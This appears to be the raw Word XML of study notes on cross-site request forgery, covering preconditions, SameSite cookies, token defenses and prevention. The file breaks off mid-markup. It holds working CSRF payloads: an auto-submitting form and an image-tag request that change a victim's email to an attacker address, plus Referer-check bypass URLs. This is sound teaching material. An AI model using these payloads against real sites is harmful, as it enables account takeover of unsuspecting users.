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81B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Cross-site request forgery (CSRF)  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Trick a user into performing an action they don't intend to perform.  This could be:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>changing their account email to allow for password reset,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>changing content or users on the site, or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>transfering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> funds </w:t>
      </w:r>
      <w:r>
        <w:t>to the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Key factors</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>For CSRF to be possible:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>There must be an action a user can be tricked into performing unintentionally,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Only session cookies are used to validate the user's permission to perform the action; and</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The action must have predictable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameters (e.g. no CSRF tokens involved).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>This HTTP request is vulnerable to CSRF:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehttp"/>
      </w:pPr>
      <w:r>
        <w:t>POST /email/change HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Host: vulnerable-website.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
        <w:t>Content-Length: 30</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAf</w:t>
      </w:r>
      <w:r>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>email=wiener@normal-user.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The attacker can create a page with the following HTML page to cause the user to change their email address when a victim visits it:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;body&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;form action="https://vulnerable-website.com/email/change" method</w:t>
      </w:r>
      <w:r>
        <w:t>="POST"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/form&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>document.forms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>0].submit();</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/body&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">For the above to work, the victim must be logged in to the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">vulnerable website and the session cookie is not using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> attribute.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:warning</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: CSRF attacks can also occur when HTTP basic </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cerfiticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is used by a site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">CSRF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:b w:val="0"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> defense</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">An attribute set on session cookies that can have one of </w:t>
      </w:r>
      <w:r>
        <w:t>two values:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Strict</w:t>
      </w:r>
      <w:r>
        <w:t>: the cookie is only sent with same-site requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Lax</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: the cookie is sent with same-site requests and top-level </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> navigations (e.g. user clicking a link).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">The risk with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Lax</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is that some sites will allow sensitive actions to be performe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests, even if not explicitly coded that way.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>CSRF are delivery is similar to XSS and depends on the HTTP verb used to perform the action:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: create an HTML form with the action and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>params</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and induce the victim to visit the page.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>GE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: create an image element with the malicious action as a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and have the victim visit the page:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>There are several different ways to bypass CSRF defenses, depending on the s</w:t>
      </w:r>
      <w:r>
        <w:t>ite:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">CSRF not validated for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CSRF not validated if token is missing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CSRF not tied to user session and only checked for validity.  In this case, the attacker can use their own CSRF token in the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">CSRF tied to a non-session cookie.  </w:t>
      </w:r>
      <w:r>
        <w:t>Relies on the attacker being able to set a cookie on the victim's browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CSRF is set in the cookie ("double submit cookie pattern") and the attacker can set the cookie on the victim's request.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> based validation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Some sites attempt to prevent CSRF b</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y checking the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header.  However this header can be spoofed or crafted in such a way to bypass the check.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodesh"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"># Bypass check where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header must start with the vulnerable site domain</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>http://vulnerable-website.com.attacker-website.com/csrf-attack</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"># Bypass check were </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> must appear in the header value</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>http://attacker-website.com/csrf-attack?vulnerable-website.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: Modern browsers now strip query parameters from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header.  You can override this by setting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Referrer-Policy: uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>afe-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header on your request.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XSS vs CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Both attacks involve causing the victim to unintentionally perform an action:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">'XSS': </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caues</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the victim to execute malicious JavaScript on the vulnerable site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">'CSRF': causes the victim to perform an action on the </w:t>
      </w:r>
      <w:r>
        <w:t>vulnerable site through visiting a malicious page.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>CSRF is generally harder to exploit because most sites implement CSRF defenses and the attacks usually only apply to a subset of user actions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>CSRF are also only "one-way" in that they cause a user to subm</w:t>
      </w:r>
      <w:r>
        <w:t>it a request, but the attacker cannot see the response directly.  With XSS the attacker can see the response and can use it to further their attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>XSS and CSRF tokens</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Reflected XSS can be mitigated by CSRF tokens since they add a unique value to each req</w:t>
      </w:r>
      <w:r>
        <w:t>uest.  But, CSRF tokens are not always validated for all requests and can be bypassed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Stored XSS are not prevented by CSRF as they trigger when the user visits the page, which will include a valid CSRF token generated by the site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use CSRF tokens </w:t>
      </w:r>
      <w:r>
        <w:t>with high entropy that are tied to the user's session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Provide additional forms of verification on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sensitve</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CSRF tokens</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Unique, high-entropy random value submitted with a user's request.  The server validates the token to en</w:t>
      </w:r>
      <w:r>
        <w:t>sure the request is not a CSRF attack.  Additional context specific values (e.g. timestamp + salt) can be used to generate the token, which makes it harder to guess.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>These tokens should be transmitted either as:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">a hidden field that appears before any user </w:t>
      </w:r>
      <w:r>
        <w:t>controllable content to prevent the attacker from inserting their own token into the request; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header value since browsers prevent injecting custom headers on cross-domain requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;input type="hidden" name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>csrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-token" value="CIwNZNlR4XbisJF39I8yWnWX</w:t>
      </w:r>
      <w:r>
        <w:t>9wX4WFoz" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Tokens should not be transmitted as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request parameters because:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>it will be logged in client/server-side logging,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>it is visible in the user's address bar, and</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> can be transmitted in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header to third parties.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp web vulnerability scanner</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r>
          <w:rPr>
